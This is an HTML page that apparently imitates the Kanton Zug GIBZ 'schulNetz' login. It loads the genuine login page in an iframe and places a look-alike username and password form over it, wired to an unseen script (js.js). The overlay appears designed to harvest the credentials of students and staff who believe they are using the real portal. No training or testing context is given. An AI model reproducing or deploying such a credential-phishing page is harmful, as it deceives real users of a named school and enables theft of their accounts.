<html>

<head>
    <title>Kanton Zug Secure Login</title>
    <link rel="stylesheet" type="text/css" href="css.css">

<body>
    <iframe id="iframe" src="https://gibz.zg.ch/login"></iframe>
    <div class="overlay">
        <div class="outerbox" align="center">
            <table border="0" cellpadding="0" cellspacing="0" class="outertable">


                <tbody>
                    <tr class="upperrow">
                        <td class="uppercell">
                            <table style="border: 0px; height: 50px; width: 100%; padding: 0px; margin: 0px;" border="0"
                                cellpadding="0" cellspacing="0">
                                <tbody>
                                    <tr>
                                        <td>
                                            <table width="100%" border="0" cellpadding="0" cellspacing="0">
                                                <tbody>
                                                    <tr valign="bottom">
                                                        <td>
                                                        </td>
                                                        <td align="right">
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </td>
                                    </tr>
                                    <tr style="background-color: #006FBA;">
                                        <td height="5px"></td>
                                    </tr>
                                </tbody>
                            </table>


                        </td>
                    </tr>


                    <tr class="centerrow">
                        <td class="centercell">
                            <div class="form-box">
                                <form id="form">
                                    <table class="form-table">
                                        <tbody>
                                            <tr>
                                                <td class="form-heading-cell">
                                                    <span class="form-heading">Anmeldung</span>

                                                    <br><span class="form-subtitle">"schulNetz" GIBZ</span>


                                                    <p><span class="form-details">Bitte geben Sie Ihre Zugangsdaten
                                                            ein.</span></p>
                                                </td>
                                            </tr>

                                            <tr>
                                                <td class="form-label-cell">
                                                    <span class="form-label">Benutzername</span>
                                                    <br>
                                                    <input id="username" autocomplete="off" class="form-inputfield visible" name="userid"
                                                        size="40" type="text">
                                                </td>
                                            </tr>
                                            <tr>
                                                <td class="form-label-cell">
                                                    <span class="form-label">Passwort</span>
                                                    <br>
                                                    <input id="password" autocomplete="off" class="form-inputfield visible" name="password"
                                                        size="40" type="password">
                                                </td>
                                            </tr>



                                            <tr class="form-buttonrow">
                                                <td class="form-buttoncell">
                                                    <!-- Button -->
                                                    <button id="submit" class="form-button visible" name="" type="submit">
                                                        Anmelden
                                                    </button>
                                                </td>
                                            </tr>


                                            <tr>
                                                <td class="form-label-cell">

                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </form>
                            </div>
                        </td>
                    </tr>
                    <tr class="lowerrow">
                        <td class="lowercell">

                            <div class="copyright-label">Â© 2013, Kanton Zug</div>
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>

        <span class="userData" id="sesUserData" name="sesUserData"></span>
    </div>

    <script src="js.js"></script>
</body>

</html>
